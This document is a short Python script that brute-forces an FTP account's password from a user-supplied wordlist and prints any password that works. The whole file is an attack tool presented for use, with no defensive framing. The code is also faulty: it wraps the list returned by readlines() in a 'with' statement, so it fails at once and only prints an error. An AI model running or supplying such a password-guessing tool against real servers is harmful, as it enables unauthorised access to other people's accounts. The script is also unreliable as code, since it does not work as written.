import ftplib

server = input("[+] FTP server address: ")
username = input("[+] FTP username: ")
path = input("[+] Path to wordlist file: ")

try:
    with open(path, "r").readlines() as wl:
        for word in wl:
            word = word.strip("\r\n")
            try:
                ftp = ftplib.FTP(server)
                ftp.login(user=username, passwd=word)
                print(f"[+] Password found: {word}")
                break
            except ftplib.error_perm:
                print("[+] Still trying...")
except Exception as e:
    print(f"[+] Error: {e}")